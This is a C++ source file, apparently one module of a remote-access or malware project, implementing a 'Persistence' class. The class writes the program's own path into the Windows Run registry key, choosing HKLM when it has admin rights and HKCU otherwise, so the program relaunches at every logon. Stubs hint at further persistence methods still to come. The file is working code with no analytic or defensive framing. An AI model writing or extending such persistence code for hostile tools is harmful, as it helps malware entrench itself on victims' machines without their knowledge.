#include "../inc/Persistence.h"
#include "../inc/other.h"
#include "../inc/common.h"
#include "../inc/Exec.h"


using namespace std;


Persistence::Persistence(bool admin,wstring path_prog)
{
    a_is_admin = admin;
    a_path_prog = path_prog;
}


INT Persistence::customPersi()
{
    //Coming soon.
    return 0;
}


VOID  Persistence::main() 
{       
    WCHAR value[] = L"" NAME_KEY_REGISTER; 
    HKEY hKey, HKEY_admin_or_not;
    
    LONG status;
    DWORD error = false;
    
    WCHAR path_of_key[MAX_PATH];

    //Initialization of variables according to privileges. 
    if(a_is_admin) //test if admin | if admin set  HKEY_LOCAL_MACHINE else set HKCU
    {
        //if user is admin
        HKEY_admin_or_not = HKEY_LOCAL_MACHINE;
        wcscpy(path_of_key, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    }
    else
    {
        //if user not admin
        HKEY_admin_or_not = HKEY_CURRENT_USER;
        wcscpy(path_of_key, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    }

    if(RegOpenKeyExW(HKEY_admin_or_not,path_of_key, 0, KEY_ALL_ACCESS, &hKey) == 0) //https://stackoverflow.com/questions/820846/regopenkeyex-fails-on-hkey-local-machine
    {
        status = RegSetValueExW(hKey,value ,0 , REG_SZ, (LPBYTE)a_path_prog.c_str(), a_path_prog.size() * sizeof(WCHAR));
        if(status != 0)
        {
            error = true;
        }
        RegCloseKey(hKey);   

    }
    else
    {
        error = true;
    }

    //If error 
    if(error)
    {
        //defaultPersi(); TO CHANGE
    }    
}
    
/*
//- https://stackoverflow.com/questions/6308426/reggetvalue-questions
http://www.cplusplus.com/forum/general/50264/
https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights

Contrairement à la fonction RegCreateKeyEx , la fonction RegOpenKeyEx ne crée pas la clé spécifiée si la clé n'existe pas dans le Registre.
*/